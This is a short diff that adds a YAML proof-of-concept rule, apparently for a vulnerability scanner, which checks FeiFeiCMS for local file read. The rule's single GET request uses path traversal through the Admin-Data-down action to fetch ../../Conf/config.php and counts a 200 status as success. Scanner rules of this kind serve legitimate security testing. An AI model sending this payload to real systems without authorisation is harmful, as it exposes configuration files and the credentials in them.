@@ -1,0 +1,9 @@
+name: poc-yaml-feifeicms-lfr
+rules:
+  - method: GET
+    path: /index.php?s=Admin-Data-down&id=../../Conf/config.php
+    expression: |
+      status == 200 
+detail:
+  author: jinqi
+  links: https://www.cnblogs.com/jinqi520/p/10202615.html
